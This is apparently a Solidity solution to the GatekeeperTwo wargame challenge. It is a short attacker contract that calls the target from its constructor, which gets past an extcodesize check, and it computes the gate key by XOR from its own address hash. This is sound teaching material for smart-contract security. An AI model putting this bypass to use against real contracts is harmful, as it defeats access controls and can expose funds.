// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import "./GatekeeperTwo.sol";

/// @title GatekeeperTwo challenge attacker contract 
/// @notice This attacker contract has to pass through 3 gates as well. 
/// First one is by making the call from a contract, different from the EOA who is sending the transaction
/// Second requires that the extcodesize of msg.sender (our attacker contract) equals 0, 
/// what means a contract call from a contract with no code available in the EVM, 
/// That is the case of EOA accounts, but also when contracts are being deployed/ executing constructor func.
/// Third is by calling the contract func with a bytes8 key, result of precomputed bytes using XOR operator. 
/// Important, to send address(this) to call, and not msg.sender. 
contract GatekeeperTwoAttack {

  GatekeeperTwo gatekeeperTwoContract;

  constructor(address _address) public{
    gatekeeperTwoContract = GatekeeperTwo(_address);
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
    address(gatekeeperTwoContract).call(abi.encodeWithSignature("enter(bytes8)", key));
  }
 
}